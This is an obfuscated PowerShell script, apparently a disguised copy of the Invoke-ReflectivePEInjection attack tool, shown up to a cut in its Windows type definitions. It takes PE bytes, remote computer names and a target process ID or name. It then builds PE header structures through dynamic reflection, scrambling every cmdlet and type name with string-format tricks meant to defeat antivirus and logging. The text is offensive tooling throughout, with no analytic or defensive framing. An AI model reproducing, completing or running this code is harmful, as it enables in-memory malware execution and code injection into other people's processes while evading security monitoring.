&("{1}{0}{2}" -f 'eT-it','S','EM') ("vaR"+"IAblE"+":YzGKO0") ( [TYpE]("{5}{3}{8}{0}{2}{6}{9}{1}{4}{7}" -f'E.I','ERvI','N','nTi','CeS.marSHAlaSA','SySTem.ru','tEr','tTriBUTE','M','OpS')  );${R0`y4}  = [tyPE]("{4}{2}{0}{3}{6}{7}{5}{1}" -F'.Ru','AnaGEDtYPe','M','NTime.iNtERopseRVICES.','SysTe','M','u','N')  ;  ${91`TR}=[TyPe]("{1}{0}" -f'nt32','i')  ;   &('Sv') ('oU'+'1027') (  [TyPe]("{0}{1}" -f'B','OOL') ) ;    ${0`4l`j2}= [tYPE]("{0}{1}" -F 'uIN','T32');  &("{1}{0}{2}"-f'VarIab','SEt-','le') ("{0}{1}"-f'SrP','7')  ([tyPe]("{3}{0}{2}{1}"-F 'T','r','e','bITconVer')  )  ; ${0`y`EMDa}=[tYpE]("{2}{8}{9}{6}{5}{3}{0}{1}{7}{4}"-f 'M','i','SYste','e','BUildeRacCEsS','ECtIoN.','fl','t.aSseMbLy','m.r','E') ;    &("{0}{2}{1}" -f'S','-item','ET') ('v'+'ARIaBl'+'e:vCkR')  ( [type]("{2}{9}{6}{7}{3}{8}{1}{4}{0}{5}" -F 'onVENTI','g','sYSTEm.','.ca','c','onS','l','EcTiON','LLIn','ref'))  ;    &("{0}{1}"-f 'sET-i','tem') ("{0}{2}{1}" -f'VARia','E:vU8hTM','bl')  (  [TypE]("{0}{1}" -F'appdOma','In'));   &("{0}{1}" -f 'sEt-iTe','m')  ("{4}{2}{0}{3}{1}" -f'a','E:FV62OG','I','BL','vAr')  (  [TYPe]("{1}{2}{0}"-F'T','ENvIro','Nmen')  )  ;   &("{1}{0}" -f 't','se') ("{1}{0}" -f'1B','V') ([tyPe]("{1}{0}" -f'tptR','UIN')  )  ;   &("{0}{1}" -f'SEt-ite','m') ("{1}{3}{0}{4}{2}" -f 'E:7','va','Tk','RIABl','01') ([tyPe]("{0}{1}" -F'M','AtH')  );  &("{0}{1}"-f's','eT')  ("{1}{0}"-f'M1aJ','2')  (  [TyPe]("{0}{1}"-f'iNtp','tR')  ) ;   ${C`KtmV}=  [typE]("{4}{1}{3}{0}{2}" -f'nve','S','RT','TEM.Co','sY');  &("{1}{2}{0}"-f'Tem','SE','t-i')  ("VAR"+"i"+"ABle:Bd1"+"G")  ([tYPe]("{8}{4}{1}{9}{5}{2}{3}{7}{11}{0}{10}{6}"-f's','co','siO','N.','M.IO.','eS','NMode','coM','SySTe','mpR','SIO','pRe')  )  ;    &('Sv')  69PB  ( [tYpE]("{7}{4}{1}{6}{5}{8}{0}{3}{9}{2}{10}{11}" -f '.In','m','PSErviC','T','yste','UN','.R','S','timE','ERo','eS.M','arSHal') );  function iNVOk`E-reFL`E`CtI`Ve`PeINJeCTIoN
{

[CmdletBinding()]
Param(
    [Parameter(poSiTiOn = 0, maNdAtOrY = ${t`RUe})]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    ${peby`T`eS},
	
	[Parameter(pOsItIOn = 1)]
	[String[]]
	${cO`M`P`UTeRNAmE},
	
	[Parameter(POSItiON = 2)]
    [ValidateSet( {"{2}{1}{0}" -f'g','rin','WSt'}, {"{0}{1}"-f'St','ring'}, {"{0}{1}" -f'Voi','d'} )]
	[String]
	${FunC`ReTUR`N`Ty`pE} = ("{1}{0}"-f 'oid','V'),
	
	[Parameter(POsITION = 3)]
	[String]
	${ExEA`R`Gs},
	
	[Parameter(PosITioN = 4)]
	[Int32]
	${P`RocID},
	
	[Parameter(pOSiTiOn = 5)]
	[String]
	${pr`ocnA`mE},

    [Switch]
    ${f`ORCE`ASLR},

	[Switch]
	${do`N`OTZerO`Mz}
)

&("{0}{3}{1}{2}"-f 'Set-','tr','ictMode','S') -Version 2


${r`eMOTES`cRipT`BlOck} = {
	[CmdletBinding()]
	Param(
		[Parameter(pOSItIOn = 0, mAnDatorY = ${tr`Ue})]
		[Byte[]]
		${pE`Byt`Es},
		
		[Parameter(pOSITIon = 1, maNdatORy = ${TR`UE})]
		[String]
		${FUnc`RETURNT`Y`pe},
				
		[Parameter(pOSITiOn = 2, mAndatORY = ${Tr`Ue})]
		[Int32]
		${P`Ro`ciD},
		
		[Parameter(pOsitIOn = 3, mANdaTORY = ${tr`Ue})]
		[String]
		${p`Rocn`Ame},

        [Parameter(poSItiON = 4, MAnDaTory = ${t`Rue})]
        [Bool]
        ${for`ce`AsLR}
	)
	
	
	
	
	Function GEt-`WIn`32tyPES
	{
		${WI`N3`2Ty`PES} = &("{0}{2}{1}" -f'New-Obj','t','ec') ("{2}{0}{1}"-f 'em.Ob','ject','Syst')

		
		
		${d`om`AIN} =   ${Vu8`h`TM}::"cUrRe`NTDOM`AiN"
		${DYN`Am`iC`AsSeM`BLy} = &("{1}{2}{0}{3}" -f'ec','New-O','bj','t') ("{2}{3}{0}{1}{4}"-f'o','n.Assem','Syst','em.Reflecti','blyName')(("{4}{1}{2}{0}{3}"-f'Assembl','ami','c','y','Dyn'))
		${As`sEmBl`Y`BuilDEr} = ${D`O`MaIN}.("{0}{1}{3}{2}"-f'DefineDynam','icAss','ly','emb').Invoke(${d`yNAmIc`AS`sEM`BLY},   (&("{0}{1}" -f'ite','M')  ('v'+'a'+'R'+'ia'+'BLe:0YEMda') )."v`ALuE"::"r`UN")
		${m`Od`U`L`ebUiLDeR} = ${ASSeMBlY`B`Ui`lDeR}.("{0}{2}{3}{4}{5}{1}" -f 'Def','e','ineDy','nam','icMo','dul').Invoke(("{1}{3}{4}{0}{2}"-f 'l','Dynam','e','i','cModu'), ${f`AlsE})
		${cO`NS`TruCTO`RINfo} =  (  &("{1}{2}{0}"-f 'le','vari','aB') ("{2}{1}{0}"-f '0','o','yZGk')  -vAlUEON ).("{4}{2}{3}{0}{1}"-f'to','rs','e','tConstruc','G').Invoke()[0]


		
		
		${t`yPEbUI`l`DEr} = ${m`O`duLeBUI`l`dER}.("{1}{0}{2}"-f 'fi','De','neEnum').Invoke(("{2}{0}{3}{1}"-f 'i','e','Mach','neTyp'), ("{0}{1}{2}" -f 'P','u','blic'), [UInt16])
		${tYPebU`ILD`ER}.("{1}{2}{0}{3}"-f'eLitera','Defi','n','l').Invoke(("{0}{1}"-f'Nativ','e'), [UInt16] 0) | &("{1}{0}{2}" -f'Nu','Out-','ll')
		${tyPeB`Ui`l`dER}.("{2}{0}{1}" -f 'neL','iteral','Defi').Invoke(("{0}{1}"-f'I','386'), [UInt16] 0x014c) | &("{2}{1}{0}"-f'Null','ut-','O')
		${tyPEbU`i`ldeR}.("{0}{2}{1}"-f'DefineLi','l','tera').Invoke(("{0}{1}"-f'It','anium'), [UInt16] 0x0200) | &("{0}{1}{2}"-f 'Out-N','u','ll')
		${T`ypeBuIl`d`er}."D`EFINeLit`erAL"('x64', [UInt16] 0x8664) | &("{2}{1}{0}" -f'ull','N','Out-')
		${mAC`h`inET`YpE} = ${tYP`ebU`IL`der}.("{0}{2}{1}"-f'CreateT','pe','y').Invoke()
		${w`In32tyP`Es} | &("{0}{1}{2}"-f 'A','dd-Me','mber') -MemberType ("{3}{1}{0}{2}"-f'rop','oteP','erty','N') -Name ("{1}{2}{0}{3}" -f 'n','Ma','chi','eType') -Value ${MaCHi`NEtY`pE}

		
		${ty`p`ebUildEr} = ${mO`D`ULEb`UIldER}.("{0}{2}{1}"-f 'Def','eEnum','in').Invoke(("{0}{1}{2}"-f 'Magic','Ty','pe'), ("{1}{0}{2}"-f 'li','Pub','c'), [UInt16])
		${TYpeB`U`IlDer}.("{1}{3}{0}{2}" -f 'ra','D','l','efineLite').Invoke(("{6}{7}{1}{3}{4}{5}{0}{2}" -f '32','TIO','_MAGIC','N','AL_','HDR','IMAGE_NT_','OP'), [UInt16] 0x10b) | &("{2}{1}{0}" -f'ull','ut-N','O')
		${TYPEbU`I`l`DeR}.("{1}{0}{2}" -f 'L','Define','iteral').Invoke(("{5}{4}{0}{1}{3}{6}{2}{7}"-f '_OPTION','AL','MA','_','AGE_NT','IM','HDR64_','GIC'), [UInt16] 0x20b) | &("{1}{2}{0}"-f'll','Ou','t-Nu')
		${mAGI`C`TYPe} = ${Ty`pe`B`UILdeR}.("{2}{0}{1}" -f 'r','eateType','C').Invoke()
		${win3`2T`YpeS} | &("{1}{2}{0}" -f 'r','Add-M','embe') -MemberType ("{1}{0}{2}"-f 'op','NotePr','erty') -Name ("{2}{0}{1}" -f'icT','ype','Mag') -Value ${M`AGICt`Ype}

		
		${tYpe`B`UiLDEr} = ${Modu`LEbu`ILd`er}.("{3}{0}{1}{2}" -f 'f','i','neEnum','De').Invoke(("{0}{1}{2}{3}" -f'Su','bSy','st','emType'), ("{2}{1}{0}" -f 'blic','u','P'), [UInt16])
		${T`YPeBU`I`lder}.("{0}{3}{2}{1}"-f 'De','teral','neLi','fi').Invoke(("{6}{0}{1}{3}{5}{4}{2}"-f 'MAGE_SUB','SYSTE','NOWN','M','K','_UN','I'), [UInt16] 0) | &("{1}{0}{2}"-f'ut-N','O','ull')
		${TYpe`Bui`ld`er}.("{2}{0}{3}{1}"-f'eLi','ral','Defin','te').Invoke(("{0}{5}{2}{4}{1}{3}"-f 'IMAG','NATIV','_SUBSYSTEM','E','_','E'), [UInt16] 1) | &("{0}{1}{2}"-f 'Ou','t-Nul','l')
		${t`YPeBuIl`DER}.("{3}{1}{0}{4}{2}"-f 'ineLit','f','al','De','er').Invoke(("{3}{8}{5}{4}{2}{1}{7}{0}{6}"-f '_WIN','Y','UBS','I','E_S','AG','DOWS_GUI','STEM','M'), [UInt16] 2) | &("{2}{0}{1}"-f '-Nul','l','Out')
		${tY`pEbUi`L`dER}.("{2}{1}{3}{4}{0}"-f'al','efin','D','eLi','ter').Invoke(("{5}{2}{3}{6}{0}{1}{4}" -f'WS_C','U','A','GE_S','I','IM','UBSYSTEM_WINDO'), [UInt16] 3) | &("{2}{1}{0}"-f 'll','t-Nu','Ou')
		${TYpeB`U`i`LdEr}.("{3}{2}{1}{0}"-f'eral','eLit','in','Def').Invoke(("{6}{5}{3}{0}{1}{4}{2}" -f'STEM_','P','I','AGE_SUBSY','OSIX_CU','M','I'), [UInt16] 7) | &("{0}{2}{1}"-f'Out-','l','Nul')
		${tyP`EbuiLd`ER}.("{0}{1}{2}"-f'Def','ine','Literal').Invoke(("{3}{5}{7}{0}{6}{2}{4}{1}" -f 'SYS','UI','DOWS','I','_CE_G','MAGE','TEM_WIN','_SUB'), [UInt16] 9) | &("{1}{0}"-f 'ut-Null','O')
		${t`YPeBU`ILDEr}.("{2}{0}{3}{1}"-f'efin','al','D','eLiter').Invoke(("{6}{4}{2}{0}{3}{5}{7}{1}{8}" -f 'BS','PPL','SU','YST','AGE_','EM_','IM','EFI_A','ICATION'), [UInt16] 10) | &("{2}{1}{0}"-f 'ull','N','Out-')
		${Typ`eB`UIldeR}.("{2}{0}{1}" -f'ne','Literal','Defi').Invoke(("{5}{2}{6}{11}{3}{8}{7}{1}{9}{0}{10}{4}" -f 'CE_','OOT','AGE_','T','R','IM','S','_EFI_B','EM','_SERVI','DRIVE','UBSYS'), [UInt16] 11) | &("{1}{2}{0}"-f 'l','Out-Nu','l')
		${TYpe`B`UilDER}.("{2}{0}{1}{3}" -f 'L','itera','Define','l').Invoke(("{2}{5}{8}{4}{6}{1}{3}{0}{7}" -f 'R','_','IMAGE','D','SYSTEM_EFI_RUNTIM','_','E','IVER','SUB'), [UInt16] 12) | &("{0}{1}{2}" -f 'Out-N','ul','l')
		${t`ypebu`Il`DEr}.("{1}{0}{2}" -f'eL','Defin','iteral').Invoke(("{3}{4}{2}{1}{0}" -f'OM','R','E_SUBSYSTEM_EFI_','IMA','G'), [UInt16] 13) | &("{1}{0}{2}"-f 'l','Out-Nu','l')
		${T`ype`BuILdeR}.("{2}{3}{0}{1}"-f't','eral','DefineL','i').Invoke(("{2}{0}{3}{4}{1}"-f'MAG','BOX','I','E_SUBSYS','TEM_X'), [UInt16] 14) | &("{2}{1}{0}"-f'll','u','Out-N')
		${S`UBsyS`T`EmT`YPe} = ${TyPE`BUIld`eR}.("{1}{0}{2}" -f 'teT','Crea','ype').Invoke()
		${WIN`32t`ypEs} | &("{1}{2}{0}" -f 'er','Add-','Memb') -MemberType ("{3}{2}{1}{0}" -f'y','opert','ePr','Not') -Name ("{1}{0}{2}"-f 'bSys','Su','temType') -Value ${suBSYst`EM`Ty`pe}

		
		${TYPEB`U`iLDER} = ${M`ODulEbU`iLD`er}.("{1}{0}{2}"-f 'ineEn','Def','um').Invoke(("{5}{1}{2}{6}{0}{3}{4}"-f 'er','llCha','ra','istics','Type','D','ct'), ("{0}{1}"-f'Pu','blic'), [UInt16])
		${T`ypEbUil`d`eR}.("{3}{0}{1}{2}"-f 'e','Lite','ral','Defin').Invoke(("{1}{0}" -f '_0','RES'), [UInt16] 0x0001) | &("{0}{1}{2}"-f'Out','-N','ull')
		${TYpEB`Ui`l`deR}.("{1}{0}{2}" -f 'r','DefineLite','al').Invoke(("{0}{1}" -f'RES','_1'), [UInt16] 0x0002) | &("{0}{2}{1}" -f'Out','ull','-N')
		${TyPEbu`il`DeR}.("{1}{3}{0}{4}{2}"-f 'L','Defi','ral','ne','ite').Invoke(("{1}{0}" -f'_2','RES'), [UInt16] 0x0004) | &("{0}{1}{2}" -f'O','ut-N','ull')
		${tYp`E`BuIl`der}.("{2}{0}{3}{1}"-f 'fineLi','eral','De','t').Invoke(("{1}{0}" -f 'ES_3','R'), [UInt16] 0x0008) | &("{1}{0}"-f 'ull','Out-N')
		${T`yp`EbuiLDeR}.("{1}{0}{2}" -f 'ra','DefineLite','l').Invoke(("{2}{1}{7}{5}{0}{4}{8}{6}{9}{10}{11}{3}"-f 'ACTE','AG','IM','E','RIS','_DLL_CHAR','I','E','T','CS_DYN','AMIC_B','AS'), [UInt16] 0x0040) | &("{1}{0}" -f'Null','Out-')
		${T`ypEbuil`DeR}.("{0}{1}{2}{3}"-f'DefineLit','er','a','l').Invoke(("{7}{10}{2}{5}{4}{6}{0}{1}{11}{9}{3}{8}" -f'I','CS','_DLL_CH','CE','ACTE','AR','RIST','IM','_INTEGRITY','FOR','AGE','_'), [UInt16] 0x0080) | &("{2}{0}{1}"-f 'ut','-Null','O')
		${t`y`pEBUI`lDER}.("{2}{0}{1}{3}" -f 'fineLit','er','De','al').Invoke(("{3}{2}{0}{4}{6}{5}{1}{7}"-f '_DLL_','ISTICS_NX_COMPA','AGE','IM','CHARAC','R','TE','T'), [UInt16] 0x0100) | &("{1}{0}"-f'-Null','Out')
		${TYP`EB`UIl`DeR}.("{2}{0}{1}"-f'e','ral','DefineLit').Invoke(("{6}{4}{1}{2}{0}{3}{7}{5}"-f'ER','_DLLC','HARACT','ISTICS_NO_IS','GE','ON','IMA','OLATI'), [UInt16] 0x0200) | &("{0}{1}{2}" -f'Out-N','u','ll')
		${t`YpeB`UIlD`eR}.("{2}{1}{3}{0}"-f 'al','Li','Define','ter').Invoke(("{1}{6}{5}{8}{0}{2}{7}{3}{4}"-f'IC','IM','S_N','E','H','C','AGE_DLLCHARA','O_S','TERIST'), [UInt16] 0x0400) | &("{1}{2}{0}"-f'Null','O','ut-')
		${typEB`UILd`er}.("{1}{3}{2}{0}"-f'iteral','D','neL','efi').Invoke(("{7}{3}{6}{5}{4}{2}{1}{0}"-f'_BIND','_NO','CS','E_D','ERISTI','CHARACT','LL','IMAG'), [UInt16] 0x0800) | &("{0}{2}{1}"-f'O','Null','ut-')
		${tyPe`B`UILder}.("{4}{0}{3}{1}{2}" -f 'fi','it','eral','neL','De').Invoke(("{1}{0}" -f '4','RES_'), [UInt16] 0x1000) | &("{1}{0}{2}"-f 'ut','O','-Null')
		${T`YpEb`U`IlDEr}.("{4}{0}{2}{1}{3}"-f'fineL','te','i','ral','De').Invoke(("{4}{9}{5}{0}{1}{8}{6}{2}{7}{3}"-f'HARACTER','I','DM_DR','ER','IMAGE_','LC','_W','IV','STICS','DL'), [UInt16] 0x2000) | &("{1}{2}{0}"-f 'l','Out-','Nul')
		${t`Ype`B`UiLDer}.("{1}{0}{2}{3}" -f'Lite','Define','ra','l').Invoke(("{8}{9}{6}{2}{4}{1}{3}{5}{7}{0}" -f 'E','NAL','ISTICS_TER','_','MI','SERVER','RACTER','_AWAR','IMAGE_DLLC','HA'), [UInt16] 0x8000) | &("{1}{2}{0}" -f 'l','Out-Nu','l')
		${DLLC`hA`Ra`Ct`erisTI`cs`Type} = ${typebu`IL`D`ER}.("{0}{2}{1}" -f'Cr','pe','eateTy').Invoke()
		${wi`N`3`2tyPeS} | &("{2}{1}{0}" -f 'ber','dd-Mem','A') -MemberType ("{0}{3}{1}{2}" -f 'N','oper','ty','otePr') -Name ("{3}{5}{0}{4}{2}{6}{1}" -f 'ist','e','s','DllChar','ic','acter','Typ') -Value ${dLl`cHAr`ACT`ErisTIc`sTy`PE}

		
		
		${At`TrIBU`Tes} = ("{16}{15}{14}{18}{19}{1}{11}{5}{4}{0}{20}{6}{13}{3}{2}{10}{12}{9}{21}{17}{8}{7}" -f'Pub','ns','ici','l','Class, ',' ','E','Init','Field',', ','tLay','iClass,','out','xp','oLa','ut','A','aled, Before','y','out, A','lic, ','Se')
		${T`YPE`BUi`ldeR} = ${mo`D`U`lEbuIlder}.("{0}{2}{1}"-f 'De','ineType','f').Invoke(("{4}{1}{0}{2}{3}"-f '_DIR','A','E','CTORY','IMAGE_DAT'), ${atTR`IbU`T`Es}, [System.ValueType], 8)
		(${Typ`e`BuiLDeR}.("{0}{1}{2}" -f'Defi','neFiel','d').Invoke(("{1}{2}{3}{0}"-f'ss','Virtua','lAd','dre'), [UInt32], ("{1}{0}"-f'c','Publi'))).("{3}{0}{1}{2}" -f'O','ff','set','Set').Invoke(0) | &("{1}{2}{0}"-f'l','O','ut-Nul')
		(${tY`PeB`U`ILDeR}.("{2}{1}{0}"-f'Field','ne','Defi').Invoke(("{0}{1}" -f'S','ize'), [UInt32], ("{1}{0}" -f 'lic','Pub'))).("{0}{1}" -f'SetOffse','t').Invoke(4) | &("{0}{1}{2}" -f 'Out-','N','ull')
		${iM`Age_d`ATa_DI`REct`Ory} = ${Ty`pEbui`ldER}.("{1}{2}{3}{0}"-f 'e','C','reat','eTyp').Invoke()
		${W`I`N32typ`ES} | &("{0}{3}{1}{2}" -f 'Add-Me','e','r','mb') -MemberType ("{0}{1}{2}{3}" -f'N','o','tePrope','rty') -Name ("{4}{0}{3}{2}{1}"-f 'A','ORY','T','TA_DIREC','IMAGE_D') -Value ${i`mAGe_datA`_Di`REctORY}

		
		${attRI`BUT`ES} = ("{8}{12}{16}{13}{11}{21}{20}{1}{17}{9}{2}{15}{6}{19}{5}{10}{14}{4}{3}{7}{18}{0}"-f't','ubl',', ','reFi','led, Befo','ialLayout','que','el','A','c',', Se','as','utoLayout','siCl','a','Se',', An','i','dIni','nt',', Class, P','s')
		${tY`P`EBUILd`er} = ${M`o`DUlEBu`il`dEr}.("{0}{1}{2}"-f'D','efine','Type').Invoke(("{4}{3}{2}{1}{0}" -f 'ER','ILE_HEAD','E_F','MAG','I'), ${Attr`ib`Ut`es}, [System.ValueType], 20)
		${tY`P`E`BuILdeR}.("{0}{3}{1}{2}"-f'Defin','el','d','eFi').Invoke(("{0}{1}"-f 'Ma','chine'), [UInt16], ("{1}{0}"-f'blic','Pu')) | &("{0}{1}{2}"-f'Ou','t-Nul','l')
		${T`YPEbUilD`Er}.("{0}{1}{2}"-f 'Defin','eFiel','d').Invoke(("{2}{0}{3}{1}" -f'OfSec','ions','Number','t'), [UInt16], ("{0}{1}"-f'Pub','lic')) | &("{1}{2}{0}" -f'-Null','O','ut')
		${Ty`Peb`UIl`Der}.("{0}{2}{1}" -f'Def','d','ineFiel').Invoke(("{2}{1}{4}{0}{3}"-f'eSta','imeD','T','mp','at'), [UInt32], ("{0}{1}" -f'P','ublic')) | &("{1}{0}"-f 'ut-Null','O')
		${Typ`eBuIl`D`er}.("{1}{2}{3}{0}" -f 'ld','DefineF','i','e').Invoke(("{0}{3}{5}{2}{1}{4}" -f'PointerToS','lTa','o','y','ble','mb'), [UInt32], ("{1}{0}" -f 'lic','Pub')) | &("{0}{2}{1}" -f 'O','-Null','ut')
		${t`ypeb`UIlDER}.("{0}{1}{3}{2}" -f'D','efineFi','d','el').Invoke(("{3}{1}{0}{2}"-f'fS','umberO','ymbols','N'), [UInt32], ("{1}{0}" -f 'blic','Pu')) | &("{1}{0}{2}" -f'u','O','t-Null')
		${TypebuI`l`d`ER}.("{0}{2}{3}{1}" -f'De','ld','fin','eFie').Invoke(("{2}{1}{0}{3}"-f'nalHea','fOptio','SizeO','der'), [UInt16], ("{0}{1}"-f'Publ','ic')) | &("{1}{0}{2}" -f 'ul','Out-N','l')
		${TY`peBuiLd`er}.("{0}{1}{2}" -f 'D','efi','neField').Invoke(("{4}{2}{0}{3}{1}"-f 'racte','ics','a','rist','Ch'), [UInt16], ("{1}{0}" -f 'ublic','P')) | &("{0}{1}{2}" -f 'O','ut-N','ull')
		${I`ma`g`e`_`FilE_headeR} = ${Typ`EbUIl`DeR}.("{0}{3}{2}{1}" -f 'C','eType','t','rea').Invoke()
		${WIn32`TY`PeS} | &("{0}{2}{1}" -f 'Add-','r','Membe') -MemberType ("{1}{0}{2}"-f 'ePr','Not','operty') -Name ("{1}{3}{0}{2}" -f'ILE_HE','I','ADER','MAGE_F') -Value ${ImaGe`_FILE`_`HeADER}

		
		${ATt`RiBu`Tes} = ("{7}{11}{9}{1}{17}{22}{20}{14}{3}{10}{12}{5}{6}{19}{18}{15}{2}{0}{21}{13}{8}{4}{16}" -f 'ed, ','nsiClas','al','bli','Field','citLayo','u','AutoLayout','e',' A','c, Expl',',','i','efor',' Pu',' Se','Init','s',',','t','lass,','B',', C')
		${tYPEB`UIL`DER} = ${mODUl`eb`UiLd`eR}.("{2}{1}{0}"-f'pe','fineTy','De').Invoke(("{6}{4}{0}{2}{5}{3}{1}" -f 'AGE','64','_OPTI','AL_HEADER','M','ON','I'), ${AttRI`BUt`Es}, [System.ValueType], 240)
		(${tYp`Eb`UILD`er}.("{3}{2}{1}{0}"-f'ld','neFie','fi','De').Invoke(("{1}{0}" -f 'agic','M'), ${MA`gi`ctYpE}, ("{2}{1}{0}"-f'ic','l','Pub'))).("{2}{0}{1}"-f 'ff','set','SetO').Invoke(0) | &("{2}{0}{1}"-f'-N','ull','Out')
		(${tY`pebU`iLd`eR}.("{3}{2}{1}{0}" -f 'ld','Fie','ine','Def').Invoke(("{2}{3}{0}{1}" -f 'ers','ion','MajorLin','kerV'), [Byte], ("{1}{0}"-f 'lic','Pub'))).("{2}{1}{0}"-f 'fset','Of','Set').Invoke(2) | &("{2}{1}{0}"-f 'l','Nul','Out-')
		(${TYPebUI`ld`eR}.("{1}{0}{3}{2}"-f'efi','D','eField','n').Invoke(("{0}{2}{1}{3}{4}"-f'MinorLi','ke','n','rVersio','n'), [Byte], ("{0}{1}"-f'Publi','c'))).("{1}{2}{0}" -f 'Offset','Se','t').Invoke(3) | &("{2}{1}{0}"-f'll','u','Out-N')
		(${t`Yp`eBuiLDER}.("{2}{1}{0}" -f'd','efineFiel','D').Invoke(("{2}{0}{1}" -f 'z','eOfCode','Si'), [UInt32], ("{0}{1}{2}"-f 'P','ubl','ic'))).("{3}{1}{2}{0}" -f 'et','tOf','fs','Se').Invoke(4) | &("{2}{0}{1}"-f'-N','ull','Out')
		(${TY`P`EbUiLder}.("{1}{3}{2}{0}" -f'ld','De','ie','fineF').Invoke(("{3}{5}{0}{1}{4}{2}"-f'O','fInitia','izedData','Si','l','ze'), [UInt32], ("{0}{2}{1}" -f'Pub','ic','l'))).("{0}{1}"-f'Se','tOffset').Invoke(8) | &("{1}{0}"-f'l','Out-Nul')
		(${T`yPE`Bu`IldEr}.("{1}{0}{2}{3}" -f'efin','D','e','Field').Invoke(("{0}{1}{4}{3}{2}"-f'Siz','eOfU','edData','z','ninitiali'), [UInt32], ("{0}{1}{2}"-f 'Pu','bl','ic'))).("{0}{1}{2}"-f'Se','tOffse','t').Invoke(12) | &("{2}{1}{0}" -f'ull','-N','Out')
		(${TYp`ebui`Ld`Er}.("{1}{2}{0}" -f'eld','Defi','neFi').Invoke(("{3}{4}{1}{2}{0}"-f 'yPoint','dressOfEnt','r','A','d'), [UInt32], ("{1}{0}"-f'lic','Pub'))).("{0}{1}"-f'Set','Offset').Invoke(16) | &("{0}{1}" -f 'Out-N','ull')
		(${t`YpEbUi`L`DeR}.("{1}{0}{3}{2}"-f 'Fi','Define','ld','e').Invoke(("{1}{0}{2}" -f'aseOf','B','Code'), [UInt32], ("{1}{2}{0}"-f 'lic','P','ub'))).("{2}{1}{0}" -f 'ffset','O','Set').Invoke(20) | &("{0}{2}{1}"-f'Out','ll','-Nu')
		(${t`YpEb`UiLder}.("{1}{2}{0}"-f 'd','D','efineFiel').Invoke(("{2}{1}{0}"-f'ase','eB','Imag'), [UInt64], ("{0}{1}"-f 'Publ','ic'))).("{1}{0}{2}" -f 'tOffs','Se','et').Invoke(24) | &("{1}{0}"-f 'Null','Out-')
		(${TyP`E`BuilDeR}.("{3}{0}{2}{1}" -f 'neF','d','iel','Defi').Invoke(("{4}{2}{1}{3}{0}" -f 't','tionAli','c','gnmen','Se'), [UInt32], ("{1}{0}"-f 'ublic','P'))).("{0}{2}{1}"-f'S','Offset','et').Invoke(32) | &("{0}{1}" -f 'Out','-Null')
		(${Typ`e`BUIL`DeR}.("{3}{0}{1}{2}" -f 'efi','neFiel','d','D').Invoke(("{2}{0}{1}" -f 'i','leAlignment','F'), [UInt32], ("{1}{0}" -f'lic','Pub'))).("{1}{2}{0}" -f'tOffset','S','e').Invoke(36) | &("{1}{0}{2}" -f'ut-Nu','O','ll')
		(${TY`P`eBUiLDeR}.("{3}{1}{0}{2}"-f 'ineF','f','ield','De').Invoke(("{1}{5}{0}{3}{2}{4}"-f 'ratingSys','Maj','s','temVer','ion','orOpe'), [UInt16], ("{2}{1}{0}" -f'lic','b','Pu'))).("{0}{1}{2}" -f 'Set','O','ffset').Invoke(40) | &("{0}{2}{1}"-f'Out-Nu','l','l')
		(${tyPEBu`IlD`Er}.("{0}{2}{1}" -f 'Defin','Field','e').Invoke(("{0}{6}{1}{3}{5}{2}{4}{7}"-f 'M','orO','ingSys','pe','temV','rat','in','ersion'), [UInt16], ("{0}{2}{1}" -f'Pu','c','bli'))).("{1}{2}{0}"-f 'set','Set','Off').Invoke(42) | &("{2}{1}{0}"-f'ull','t-N','Ou')
		(${Ty`PEB`UI`LDER}.("{1}{0}{3}{2}"-f 'e','D','eld','fineFi').Invoke(("{4}{1}{0}{5}{3}{2}"-f'r','ajo','ageVersion','m','M','I'), [UInt16], ("{0}{1}"-f'Pu','blic'))).("{1}{2}{0}" -f't','Se','tOffse').Invoke(44) | &("{2}{1}{0}" -f 'l','-Nul','Out')
		(${tYPe`B`UIlDeR}.("{0}{2}{1}" -f 'D','neField','efi').Invoke(("{3}{1}{0}{2}"-f'eVer','Imag','sion','Minor'), [UInt16], ("{1}{2}{0}" -f'c','Pu','bli'))).("{2}{0}{1}" -f 'tOff','set','Se').Invoke(46) | &("{1}{0}" -f'ut-Null','O')
		(${tyPEBU`i`Ld`ER}.("{0}{3}{1}{2}"-f'De','neFi','eld','fi').Invoke(("{3}{1}{2}{0}{4}" -f 'io','Subsyst','emVers','Major','n'), [UInt16], ("{1}{0}"-f 'lic','Pub'))).("{1}{0}"-f'tOffset','Se').Invoke(48) | &("{2}{1}{0}" -f'l','t-Nul','Ou')
		(${T`YpEBUiLD`Er}.("{3}{1}{0}{2}"-f'e','eFi','ld','Defin').Invoke(("{0}{3}{4}{1}{5}{6}{2}" -f'MinorS','mVer','on','ubsyst','e','s','i'), [UInt16], ("{2}{1}{0}"-f 'ic','l','Pub'))).("{2}{1}{0}"-f 'tOffset','e','S').Invoke(50) | &("{1}{0}{2}"-f '-N','Out','ull')
		(${TY`PEbUild`eR}.("{2}{1}{0}"-f 'neField','fi','De').Invoke(("{4}{1}{3}{0}{2}"-f 'ionVal','V','ue','ers','Win32'), [UInt32], ("{2}{0}{1}"-f 'l','ic','Pub'))).("{0}{1}" -f 'SetOf','fset').Invoke(52) | &("{2}{1}{0}" -f'-Null','ut','O')
		(${TYpEb`UIL`DeR}.("{2}{1}{0}"-f 'neField','efi','D').Invoke(("{0}{2}{1}"-f'Si','e','zeOfImag'), [UInt32], ("{0}{1}" -f 'Publ','ic'))).("{0}{2}{1}"-f 'Se','Offset','t').Invoke(56) | &("{0}{1}" -f'Out-N','ull')
		(${t`YP`EbuIl`DER}.("{3}{2}{0}{1}"-f'l','d','ie','DefineF').Invoke(("{2}{1}{0}" -f'eaders','izeOfH','S'), [UInt32], ("{1}{0}"-f'ic','Publ'))).("{2}{0}{3}{1}" -f'f','t','SetOf','se').Invoke(60) | &("{1}{0}"-f 'ut-Null','O')
		(${TY`PeBU`iLD`ER}.("{3}{0}{2}{1}"-f 'fine','d','Fiel','De').Invoke(("{1}{0}" -f 'm','CheckSu'), [UInt32], ("{1}{0}"-f 'lic','Pub'))).("{0}{1}{2}"-f'Set','O','ffset').Invoke(64) | &("{0}{1}{2}"-f'Ou','t-N','ull')
		(${ty`PeBuil`D`er}.("{2}{0}{1}" -f'e','fineField','D').Invoke(("{0}{1}{2}" -f 'Su','b','system'), ${subSys`Te`MTy`pE}, ("{1}{0}" -f 'c','Publi'))).("{1}{2}{0}" -f 'et','SetOf','fs').Invoke(68) | &("{2}{0}{1}"-f 'ul','l','Out-N')
